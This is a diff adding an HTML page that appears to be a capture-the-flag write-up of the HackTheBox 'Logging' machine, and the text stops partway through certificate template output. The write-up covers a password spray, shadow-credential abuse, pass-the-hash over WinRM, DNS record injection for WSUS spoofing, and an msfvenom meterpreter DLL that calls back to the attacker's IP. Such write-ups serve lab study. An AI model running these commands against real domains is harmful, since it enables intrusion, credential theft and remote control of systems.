@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>HTB - Season10 - Writeups - Logging</title>
+   <link rel="stylesheet" href="/static/style.css">
+   <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+   <canvas class="matrix-bg" id="matrix"></canvas>
+
+   <header>
+      <div class="header-content">
+         <div class="terminal-prompt">k0d14k@kali:~#</div>
+         <div class="img-text">
+               <img src="/static/images/avatar.png" width="100rem">
+               <div class="text">
+                  <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                  <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+               </div>
+         </div>
+      </div>
+   </header>
+
+   <nav>
+      <ul>
+         <li><a href="/">Home</a></li>
+         <li><a href="/#about">Whoami</a></li>
+         <li><a href="/#skills">Skills</a></li>
+         <li><a href="/#projects">Projects</a></li>
+         <li><a href="/#contact">Contacts</a></li>
+      </ul>
+   </nav>
+
+   <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/logging.png" alt="500rem">   
+        <h1>Logging - HTB Season 10</h1>
+
+        <p>
+            <b>Categories</b>: #active-directory, #GenericWrite, #ShadowCredentials, #password-spray, #dll-hijacking, #wsus-spoofing, #ca-certificate-generation
+        </p>
+
+        <hr>
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>
+
+        <section id="asumed-breach">
+          <p>As usual with this type of machine, HackTheBox provides an initial set of credentials:</p>
+          <div class="code">
+            wallace.everette:Welcome2026@
+          </div>
+        </section>
+
+        <section id="enumeration">
+          <h2>cat enumeration</h2>
+          <h3>Nmap TCP Scan</h3>
+          
+          <div class="code">
+            k0d14k@kpb:~/Documenti/logging/enum$ nmap logging.htb <br>
+            Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-19 15:45 CEST <br>
+            Nmap scan report for logging.htb (10.129.28.204) <br>
+            Host is up (0.12s latency). <br>
+            Not shown: 987 closed tcp ports (conn-refused) <br>
+            PORT     STATE SERVICE <br>
+            53/tcp   open  domain <br>
+            80/tcp   open  http <br>
+            88/tcp   open  kerberos-sec <br>
+            135/tcp  open  msrpc <br>
+            139/tcp  open  netbios-ssn <br>
+            389/tcp  open  ldap <br>
+            445/tcp  open  microsoft-ds <br>
+            464/tcp  open  kpasswd5 <br>
+            593/tcp  open  http-rpc-epmap <br>
+            636/tcp  open  ldapssl <br>
+            3268/tcp open  globalcatLDAP <br>
+            3269/tcp open  globalcatLDAPssl <br>
+            5985/tcp open  wsman <br>
+            <br>
+            Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
+          </div>
+
+          <h2>Share Enumeration</h2>
+
+          <p>
+            Using <span class="highlight">nxc</span> it is possible to detect a non-standard shared directory called 
+            <span class="highlight">Logs</span>:</p>
+            
+            <div class="code">
+              k0d14k@kpb:~/Documenti/logging/enum$ nxc smb DC01.logging.htb -u wallace.everette -p 'Welcome2026@' --shares <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True) <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] logging.htb\wallace.everette:Welcome2026@&nbsp;&nbsp;<br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Enumerated shares <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Share&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Permissions&nbsp;&nbsp;&nbsp;&nbsp; Remark <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------&nbsp;&nbsp;&nbsp;&nbsp; ------ <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote Admin <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default share <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote IPC <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Logs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NETLOGON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logon server share&nbsp;&nbsp;<br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SYSVOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;READ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logon server share&nbsp;&nbsp;<br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.28.204&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WSUSTemp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A network share used by Local Publishing from a Remote WSUS Console Instance. <br>
+            </div>
+
+            <p>
+              After dumping the contents of the <span class="highlight">Logs</span> folder, the file 
+              <span class="highlight">IdentitySync_Trace_20260219.log</span> contains a credential leak:
+            </p>
+
+            
+            <div class="code">
+              svc_recovery:Em3rg3ncyPa$$2025
+            </div>
+
+            <p>
+              I subsequently tried several authentication methods using these credentials (including <span class="highlight">ldap</span>, 
+              <span class="highlight">smb</span>, and <span class="highlight">winrm</span>) but none of them worked. Only after noticing the 
+              recurring year at the end of the password did I export users from Bloodhound and, after drafting a list of possible passwords:
+            </p>
+            
+            <div class="code">
+              k0d14k@kpb:~/Documenti/logging/enum$ nxc ldap DC01.logging.htb -u svc_recovery -p passwords.txt --continue-on-success -k <br>
+              LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DC01.logging.htb 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)  <br>
+              [...] <br>
+              LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DC01.logging.htb 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 KDC_ERR_PREAUTH_FAILED <br>
+              LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DC01.logging.htb 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026  <br>
+            </div>
+
+            <p>
+              With the newly obtained account I discover I have <span class="highlight">GenericWrite</span> permissions on the machine account 
+              <span class="highlight">MSA_HEALTH$</span>:
+            </p>
+            
+            <img src="images/Pasted image 20260420030000.png" width="1000rem">
+
+            <p>
+              Through Bloodhound I see I have mainly 2 techniques to abuse this permission:
+              <ol>
+                <li>Targeted kerberoast (but the MSA account does not appear among kerberoastable users)</li>
+                <li>Shadow credentials</li>
+              </ol>
+            </p>
+
+            <p>
+              To carry out this attack the tool <a target="_blank" href="https://github.com/ShutdownRepo/pywhisker">pywhisker</a> can retrieve pem/pfx 
+              certificates for the target user:
+            </p>
+
+            <div class="code">
+              (venv) k0d14k@kpb:~/Documenti/logging/pywhisker/pywhisker$ python3 pywhisker.py -d "logging.htb" -u "svc_recovery" -p 'Em3rg3ncyPa$$2026' --target "MSA_HEALTH$" --action "add" -k <br>
+              /home/k0d14k/Documenti/logging/pywhisker/pywhisker/pywhisker.py:278: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). <br>
+                now = datetime.datetime.utcnow() <br>
+              [*] Searching for the target account <br>
+              [*] Target user found: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb <br>
+              [*] Generating certificate <br>
+              [*] Certificate generated <br>
+              [*] Generating KeyCredential <br>
+              [*] KeyCredential generated with DeviceID: 526a0014-0ecc-342b-0aa5-56491680bafa <br>
+              [*] Updating the msDS-KeyCredentialLink attribute of MSA_HEALTH$ <br>
+              [+] Updated the msDS-KeyCredentialLink attribute of the target object <br>
+              [*] Converting PEM -> PFX with cryptography: 4UITG5yI.pfx <br>
+              /home/k0d14k/Documenti/logging/pywhisker/pywhisker/pywhisker.py:54: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography. <br>
+                cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend()) <br>
+              [+] PFX exportiert nach: 4UITG5yI.pfx <br>
+              [i] Passwort für PFX: dCgQAvxC7UdexkRgbPMH <br>
+              [+] Saved PFX (#PKCS12) certificate & key at path: 4UITG5yI.pfx <br>
+              [*] Must be used with password: dCgQAvxC7UdexkRgbPMH <br>
+              [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+            </div>
+
+            <p>
+              We can now use these certificates to perform an SMB login. The NTLM hash will automatically appear in the connection logs:
+            </p>
+            
+            <div class="code">
+              (venv) k0d14k@kpb:~/Documenti/logging/pywhisker/pywhisker$ python3 pywhisker.py -d "logging.htb" -u "svc_recovery" -p 'Em3rg3ncyPa$$2026' --target "MSA_HEALTH$" --action "add" -k <br>
+              /home/k0d14k/Documenti/logging/pywhisker/pywhisker/pywhisker.py:278: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). <br>
+              &nbsp;&nbsp;now = datetime.datetime.utcnow() <br>
+              [*] Searching for the target account <br>
+              [*] Target user found: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb <br>
+              [*] Generating certificate <br>
+              [*] Certificate generated <br>
+              [*] Generating KeyCredential <br>
+              [*] KeyCredential generated with DeviceID: 97fb2844-b8ec-0df6-df71-73adbcbee085 <br>
+              [*] Updating the msDS-KeyCredentialLink attribute of MSA_HEALTH$ <br>
+              [+] Updated the msDS-KeyCredentialLink attribute of the target object <br>
+              [*] Converting PEM -> PFX with cryptography: DuBuprON.pfx <br>
+              /home/k0d14k/Documenti/logging/pywhisker/pywhisker/pywhisker.py:54: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography. <br>
+              &nbsp;&nbsp;cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend()) <br>
+              [+] PFX exportiert nach: DuBuprON.pfx <br>
+              [i] Passwort für PFX: r9FbGPVBy7e1z69cpuh2 <br>
+              [+] Saved PFX (#PKCS12) certificate & key at path: DuBuprON.pfx <br>
+              [*] Must be used with password: r9FbGPVBy7e1z69cpuh2 <br>
+              [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools <br>
+              (venv) k0d14k@kpb:~/Documenti/logging/pywhisker/pywhisker$ nxc smb DC01.logging.htb -u 'MSA_HEALTH$' --pem-cert DuBuprON_cert.pem --pem-key DuBuprON_priv.pem&nbsp;&nbsp;<br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.30.146&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True) <br>
+              SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.30.146&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] logging.htb\MSA_HEALTH$:603fc24ee01a9409f83c9d1d701485c5&nbsp;&nbsp;<br>
+
+            </div>
+
+            <p>With this NTLM hash we can now run <span class="highlight">winrm</span> to get a shell:</p>
+            
+            <div class="code">
+              (venv) k0d14k@kpb:~/Documenti/logging/pywhisker/pywhisker$ nxc winrm DC01.logging.htb -u 'MSA_HEALTH$' -H 603fc24ee01a9409f83c9d1d701485c5 <br>
+              WINRM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.30.146&nbsp;&nbsp; 5985&nbsp;&nbsp; DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb)  <br>
+              WINRM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.30.146&nbsp;&nbsp; 5985&nbsp;&nbsp; DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] logging.htb\MSA_HEALTH$:603fc24ee01a9409f83c9d1d701485c5 (Pwn3d!)
+            </div>
+        </section>
+
+        <section id="foothold">
+          <h2>cat foothold</h2>
+
+          <p>
+            Once the shell is opened, I find a file called <span class="highlight">monitor.ps1</span> in the <span class="highlight">Documents</span> 
+            folder. After reading it I discover it is used to check the status of a job running on the system.
+          </p>
+
+          <p>By leveraging the information in this script I manage to retrieve the job details:</p>
+
+          <img src="images/Pasted image 20260421225956.png" width="1000rem">
+
+          <p>
+            Through this path I retrieve a .NET executable (the file format is indicated in the configuration file bundled with the exe) that 
+            can be decompiled and may provide relevant information.
+          </p>
+
+          <p>To decompile this executable I use, on Windows, a tool called <a target="_blank" href="https://ilspy.org/">ilspy</a>.</p>
+          
+          <img src="images/Pasted image 20260421160521.png" width="1000rem">
+
+          <p>
+            The decompilation reveals that the <span class="highlight">main</span> method of this program checks the path 
+            <span class="highlight">C:\ProgramData\UpdateMonitor\Settings_Update.zip</span> and, if the file exists, extracts its contents 
+            into the <span class="highlight">bin</span> folder of the original software. The extracted file must be named <span class="highlight">settings_update.dll</span> 
+            and is loaded at software startup (i.e., every time the job is executed).
+          </p>
+
+          <p>
+            This behavior allows us to create a malicious DLL with <span class="highlight">msfvenom</span> and load a zip capable of opening a 
+            <span class="highlight">meterpreter</span> shell. This type of attack is known as <span class="highlight">DLL Hijacking</span> and 
+            consists of replacing a legitimate DLL with one containing malicious code injected by the attacker. The DLL must be compiled with 
+            the same architecture as the running software. The <span class="highlight">file</span> command on the exe reveals it was compiled 
+            for 32-bit, so the msfvenom payload must also target 32-bit.
+          </p>
+        </section>
+        
+        <section id="lateral-movement">
+          <h2>cat lateral-movement</h2>
+          <h3>jaylee.clifton - user flag</h3>
+          <p>
+            Once the DLL and zip are generated, I upload the file to the correct path, start <span class="highlight">msfconsole</span>, and wait:
+          </p>
+          
+          <div class="code">
+            k0d14k@kpb:~/Documenti/logging/foothold$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.148 LPORT=9999 -f dll -o settings_update.dll <br>
+            [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload <br>
+            [-] No arch selected, selecting arch: x86 from the payload <br>
+            No encoder specified, outputting raw payload <br>
+            Payload size: 354 bytes <br>
+            Final size of dll file: 9216 bytes <br>
+            Saved as: settings_update.dll <br>
+            k0d14k@kpb:~/Documenti/logging/foothold$ zip Settings_Update.zip settings_update.dll  <br>
+            updating: settings_update.dll (deflated 82%)
+          </div>
+          
+          <img src="images/Pasted image 20260421232340.png" width="1000rem">
+
+          <p>I discover I have obtained a shell as user <span class="highlight">jaylee.clifton</span> and retrieve the first flag:</p>
+
+          <img src="images/Pasted image 20260421232528.png" width="1000rem">
+
+          <p>While analyzing jaylee's files I find an HTML file inside the <span class="highlight">Documents\Tickets</span> folder with the following content:</p>
+
+          <img src="images/Pasted image 20260421232853.png" width="1000rem">
+
+          <p>
+            After some research I discover that WSUS is the Windows Update manager. This ticket also provides other very interesting details, 
+            such as the <span class="highlight">DNS not working</span> issue and the task that every 
+            <span class="highlight">120 seconds calls wsus.logging.htb</span>.
+          </p>
+
+          <p>
+            These are all the prerequisites for a <span class="highlight">WSUS spoofing attack</span>. Here is how it works:
+            <ol>
+              <li>The Domain Controller is convinced that the WSUS is a server under our control.</li>
+              <li>A fake WSUS is actually set up to receive requests.</li>
+              <li>This fake WSUS allows forcing the DC to execute commands.</li>
+            </ol>
+          </p>
+        </section>
+
+        <section id="privilege-escalation">
+          <h2>cat privilege-escalation</h2>
+          
+          <p>
+            The first step is to convince the Domain Controller that we are <span class="highlight">wsus.logging.htb</span>. To do this we use 
+            the <span class="highlight">dnstool.py</span> tool from the <span class="highlight">krbrelayx</span> suite:
+          </p>
+          
+          <div class="code">
+            k0d14k@kpb:~/Documenti/logging/krbrelayx$ python3 dnstool.py -u 'logging.htb\wallace.everette' -p 'Welcome2026@' -r 'WSUS.logging.htb' -a add -t A -d 10.10.15.148 10.129.30.240 <br>
+            [-] Connecting to host... <br>
+            [-] Binding to host <br>
+            [+] Bind OK <br>
+            [-] Adding new record <br>
+            [+] LDAP operation completed successfully
+          </div>
+
+          <p>
+            Next, a fake WSUS must be set up. For this we can use the too <a target="_blank" href="https://github.com/NeffIsBack/wsuks">wsuks</a> 
+            which also allows injecting a payload directly for privilege escalation.
+          </p>
+
+          <p>
+            Using <span class="highlight">tcpdump</span> I notice I am receiving requests (and therefore outgoing packets) on port 
+            <span class="highlight">8531</span> (WSUS usually runs on port 8530 but recall this is a custom configuration set by jaylee):
+          </p>
+          
+          <div class="code">
+            k0d14k@kpb:~/Documenti/logging/krbrelayx$ sudo tcpdump -i tun0 -Q out <br>
+            tcpdump: verbose output suppressed, use -v[v]... for full protocol decode <br>
+            listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes <br>
+            22:42:43.246523 IP 10.10.15.148.8531 > logging.htb.64337: Flags [R.], seq 0, ack 2434216885, win 0, length 0 <br>
+            22:42:43.865564 IP 10.10.15.148.8531 > logging.htb.64337: Flags [R.], seq 0, ack 1, win 0, length 0 <br>
+            22:42:44.488904 IP 10.10.15.148.8531 > logging.htb.64337: Flags [R.], seq 0, ack 1, win 0, length 0 <br>
+            22:42:44.680022 IP 10.10.15.148.9999 > logging.htb.59581: Flags [P.], seq 958539747:958539875, ack 3875469160, win 604, length 128 <br>
+            22:42:44.847876 IP 10.10.15.148.9999 > logging.htb.59581: Flags [.], ack 161, win 603, length 0 <br>
+            22:42:46.620707 IP 10.10.15.148.8531 > logging.htb.64338: Flags [R.], seq 0, ack 2313139453, win 0, length 0 <br>
+            22:42:47.239273 IP 10.10.15.148.8531 > logging.htb.64338: Flags [R.], seq 0, ack 1, win 0, length 0 <br>
+            22:42:47.863594 IP 10.10.15.148.8531 > logging.htb.64338: Flags [R.], seq 0, ack 1, win 0, length 0 <br>
+            22:42:49.994762 IP 10.10.15.148.8531 > logging.htb.64339: Flags [R.], seq 0, ack 1186725809, win 0, length 0 <br>
+            22:42:50.613707 IP 10.10.15.148.8531 > logging.htb.64339: Flags [R.], seq 0, ack 1, win 0, length 0 <br>
+            22:42:51.238836 IP 10.10.15.148.8531 > logging.htb.64339: Flags [R.], seq 0, ack 1, win 0, length 0
+          </div>
+
+          <p>
+            I therefore set <span class="highlight">wsuks</span> on that port but, with the server running, I see no outgoing packets on 
+            that port. I continue enumerating within jaylee's shell to understand the issue and notice that WSUS connections are made over HTTPS:
+          </p>
+          
+          <div class="code">
+              PS C:\Windows\system32> Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" | Select-Object WUServer, WUStatusServer <br>
+              Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" | Select-Object WUServer, WUStatusServer <br>
+              <br>
+              WUServer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WUStatusServer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+              --------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+              https://wsus.logging.htb:8531 https://wsus.logging.htb:8531
+          </div>
+
+          <p>
+            Through Bloodhound I notice that jaylee holds the <span class="highlight">IT</span> role. Knowing that this allows interacting with 
+            the Active Directory <span class="highlight">Certification Authority</span>, I enumerate the certificate templates available to this 
+            user to determine whether I can generate an SSL certificate for use with <span class="highlight">wsuks</span>:
+          </p>
+          
+          <div class="code">
+              k0d14k@kpb:~/Documenti/logging$ certipy find -u 'wallace.everette@logging.htb' -p 'Welcome2026@' -dc-ip 10.129.30.240 -stdout <br>
+              [...] <br>
+              &nbsp;&nbsp;0 <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Template Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : UpdateSrv <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Display Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: UpdateSrv <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Certificate Authorities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : logging-DC01-CA <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Enabled&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : True <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Client Authentication&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : False <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Enrollment Agent&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: False <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Any Purpose&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : False <br>
+              &nbsp;&nbsp;&nbsp;&nbsp;Enrollee Supplies Subject&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : True <br>
